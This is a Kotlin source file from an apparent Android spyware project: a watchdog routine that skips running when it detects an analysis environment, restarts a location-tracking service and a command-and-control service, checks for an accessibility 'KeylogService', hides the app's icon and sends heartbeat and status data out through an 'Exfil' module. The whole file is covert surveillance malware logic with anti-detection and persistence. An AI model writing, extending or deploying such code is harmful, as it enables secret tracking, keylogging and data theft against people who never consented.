package com.sp.watchdog

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Build
import com.sp.core.stealth.AntiDetect
import com.sp.core.stealth.IconHider
import com.sp.core.services.LocationService
import com.sp.core.c2.Exfil

object HealthCheck {
    fun run(ctx: Context) {
        if (AntiDetect.isCompromised(ctx)) return
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager

        if (!isRunning(am, LocationService::class.java.name))
            restart(ctx, LocationService::class.java)
        if (!isRunning(am, "com.sp.core.services.C2Service"))
            restart(ctx, Class.forName("com.sp.core.services.C2Service"))

        if (!isAccessibilityEnabled(ctx))
            Exfil.sendLog(ctx, "health",
                """{"acc":false,"ts":${System.currentTimeMillis()}}""")

        IconHider.hide(ctx)
        WatchdogAlarm.arm(ctx)
        Exfil.sendLog(ctx, "heartbeat",
            """{"ts":${System.currentTimeMillis()},"sdk":${Build.VERSION.SDK_INT}}""")
    }

    private fun isRunning(am: ActivityManager, name: String): Boolean {
        @Suppress("DEPRECATION")
        return am.getRunningServices(256).any { it.service.className == name }
    }

    private fun restart(ctx: Context, cls: Class<*>) {
        try {
            val i = Intent(ctx, cls)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
            else ctx.startService(i)
        } catch (_: Throwable) {}
    }

    private fun isAccessibilityEnabled(ctx: Context): Boolean {
        val enabled = android.provider.Settings.Secure.getString(
            ctx.contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(ctx.packageName + "/.accessibility.KeylogService")
    }
}